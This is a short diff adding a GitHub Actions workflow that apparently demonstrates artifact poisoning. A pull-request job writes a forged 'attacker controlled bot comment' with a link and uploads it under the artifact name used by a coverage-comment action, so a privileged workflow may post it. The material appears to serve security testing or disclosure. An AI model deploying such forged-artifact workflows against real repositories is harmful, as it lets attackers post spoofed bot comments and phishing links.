@@ -1,0 +1,14 @@
+name: Tests and Code Checks
+on:
+  pull_request:
+jobs:
+  fake:
+    runs-on: ubuntu-latest
+    steps:
+      - name: make artifact
+        run: |
+          printf 'FAKE-COVERAGE #1 ### attacker controlled bot comment from forged workflow\n\n[click me](https://example.com)\n' > python-coverage-comment-action.txt
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02
+        with:
+          name: python-coverage-comment-action
+          path: python-coverage-comment-action.txt
